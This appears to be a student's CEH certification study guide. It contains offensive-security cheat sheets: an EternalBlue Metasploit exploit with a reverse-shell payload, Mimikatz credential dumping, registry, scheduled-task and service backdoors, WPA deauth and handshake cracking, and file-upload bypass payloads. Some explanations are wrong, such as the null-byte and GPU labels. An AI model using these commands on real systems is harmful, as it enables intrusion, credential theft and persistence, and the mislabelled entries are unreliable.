# URGENT EXAM PREP — GAPS IDENTIFIED & PRIORITY STUDY GUIDE

**Exam Tomorrow | 6 Hours | 14/20 Needed to Pass**

---

## Gap Analysis Summary

**Processed:** 20 CEH tutorial videos  
**Analysis Date:** July 9, 2026  
**Current Coverage:** 60% across all domains

### Readiness by Domain

| Domain | Status | Coverage | Gaps | Study Time | Priority |
|--------|--------|----------|------|------------|----------|
| **Domain 1** | STRONG | 70% | IPv6, LDAP | 1 hour | MEDIUM |
| **Domain 2** | 🔴 CRITICAL | 40% | Metasploit, Mimikatz, PrivEsc, Post-Exp | 3-4 hours | **CRITICAL** |
| **Domain 3** | PARTIAL | 60% | Burp Suite, File Upload Bypass, XXE | 2-3 hours | HIGH |
| **Domain 4** | PARTIAL | 65% | Hash ID, John/Hashcat, Binwalk | 1-1.5 hours | MEDIUM |
| **Domain 5** | PARTIAL | 55% | ADB, APK Decompilation, MQTT | 1.5-2 hours | MEDIUM-HIGH |
| **Domain 6** | STRONG | 70% | Advanced Wireshark, Protocol Analysis | 1-1.5 hours | MEDIUM |
| **Domain 7** | 🔴 CRITICAL | 30% | Aircrack-ng, Handshake, Deauth | 2-3 hours | **CRITICAL** |

---

## STUDY ORDER FOR TOMORROW (6 HOURS)

### Phase 1: CRITICAL GAPS (5-7 hours) — **DO THIS FIRST**
1. **Domain 2 - System Hacking** (3-4 hours)
   - Metasploit Framework workflow
   - Mimikatz commands
   - Windows privilege escalation techniques
   - Post-exploitation persistence

2. **Domain 7 - Wireless** (2-3 hours)
   - Aircrack-ng complete workflow
   - Handshake capture process
   - Deauthentication attacks

### Phase 2: HIGH PRIORITY (2-3 hours)
3. **Domain 3 - Web Hacking** (if time permits)
   - Burp Suite proxy workflow
   - File upload bypass methods

### Phase 3: MEDIUM PRIORITY (if exam time allows)
4. **Domain 5 - Mobile/IoT** (key topics)
5. **Domain 4 - Cryptography** (hash identification)

---

## CRITICAL ADDITIONS NEEDED

### Domain 2: System Hacking (MISSING 60%)

**MUST KNOW — Exam Will Test This:**

#### Metasploit Framework
```bash
# Start msfconsole
msfconsole

# Search for exploits
search type:exploit platform:windows smb

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.10
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit

# Post-exploitation modules
use post/windows/gather/hashdump
use post/windows/escalate/getsystem
```

#### Mimikatz Credential Dumping
```bash
mimikatz.exe
privilege::debug           # Enable debug privilege
lsadump::sam              # Dump SAM hashes
lsadump::lsa              # Dump LSA secrets
token::impersonate /user:DOMAIN\Administrator  # Token impersonation
kerberos::ask /ticket:TGT # Request Kerberos ticket
sekurlsa::logonpasswords  # Dump logon passwords
```

#### Windows Privilege Escalation
```bash
# Unquoted Service Path
Get-WmiObject win32_service | Select Name,PathName | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}

# Weak Service Permissions
accesschk.exe -uwcqv "Authenticated Users" C:\Program Files\*

# DLL Injection via services
sc qc ServiceName
sc start ServiceName

# UAC Bypass
fodhelper.exe (UAC bypass method)
```

#### Post-Exploitation Persistence
```bash
# Registry Run Key
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\path\to\malware.exe"

# Scheduled Task
schtasks /create /tn "SystemUpdate" /tr "C:\path\to\malware.exe" /sc onlogon

# Service Installation
sc create backdoor binPath= "C:\path\to\malware.exe"
net start backdoor
```

---

### Domain 7: Wireless (MISSING 70%)

**MUST KNOW — Complete Aircrack-ng Workflow:**

#### Step 1: Put Interface in Monitor Mode
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Creates wlan0mon interface
```

#### Step 2: Scan for Networks
```bash
sudo airodump-ng wlan0mon
# Output shows:
# BSSID (MAC) | CH (Channel) | PWR | Beacon | Data | IV | LAN IP | ESSID
# Look for WPA2 networks
```

#### Step 3: Capture Handshake
```bash
# Start capture
sudo airodump-ng -c CHANNEL --bssid TARGET_BSSID -w capture wlan0mon

# In another terminal - trigger deauth
sudo aireplay-ng --deauth 10 -a TARGET_BSSID -c CLIENT_MAC wlan0mon

# Watch for "WPA handshake: TARGET_BSSID" in capture terminal
```

#### Step 4: Verify Handshake
```bash
sudo aircrack-ng -J capture.json capture-01.cap
# Outputs: "1 WPA2 handshake(s) found"
```

#### Step 5: Crack Password
```bash
# Using wordlist
sudo aircrack-ng -w /path/to/wordlist.txt capture-01.cap

# Using GPU (faster)
sudo aircrack-ng -w wordlist.txt -a 2 capture-01.cap
```

---

## ADDITIONAL CRITICAL GAPS

### Domain 3: File Upload Bypass (High Priority)
```
.php.jpg          → Server processes as .php
.php%20           → Null byte bypass
.php%00.jpg       → Magic bytes preserved
.phtml/.php3      → Alternative extensions
```

### Domain 5: ADB Commands (Medium Priority)
```bash
adb devices                          # List connected devices
adb install app.apk                 # Install APK
adb push file.txt /data/local/tmp/  # Upload file
adb pull /data/app/ .               # Download app
adb shell am start -n pkg/.Activity # Launch activity
adb logcat                          # View logs
```

### Domain 4: Hash Identification (Medium Priority)
- MD5: 32 hex chars, starts often with "5d41402abc4b..."
- SHA1: 40 hex chars
- SHA256: 64 hex chars
- NTLM: 32 hex, uppercase common
- `hash-identifier` tool auto-detects

---

## EXAM STRATEGY FOR TOMORROW

1. **Start with Known Domains** (Domains 1, 4, 6)
2. **Attack Domain 2 & 7 Early** (highest point value + most complex)
3. **Use Commands Reference** (bookmark `docs/tools-reference/`)
4. **Leverage Google/YouTube** (open-book exam)
5. **Skip Hard Challenges** (come back if time)
6. **Leave 30 min for review** before submitting

---

## Quick Reference Links

- **All Commands:** `docs/tools-reference/TOOLS-COMPLETE-REFERENCE.md`
- **Domain 2:** `docs/domain-2-system-hacking/` (UPDATE IN PROGRESS)
- **Domain 7:** `docs/domain-7-wireless/` (UPDATE IN PROGRESS)
- **Challenges:** `docs/challenges/all-challenges.md`

---

## FILES BEING UPDATED

- [ ] `docs/domain-2-system-hacking/commands.md` — Add Metasploit, Mimikatz, PrivEsc
- [ ] `docs/domain-7-wireless/commands.md` — Add Aircrack-ng workflow (CREATE NEW)
- [ ] `docs/domain-3-web-hacking/index.md` — Add Burp Suite, file upload bypass
- [ ] `docs/domain-5-mobile-iot/index.md` — Add ADB complete reference
- [ ] `docs/tools-reference/TOOLS-COMPLETE-REFERENCE.md` — Add missing tools

**Last Updated:** July 9, 2026 | **Status:** IN PROGRESS
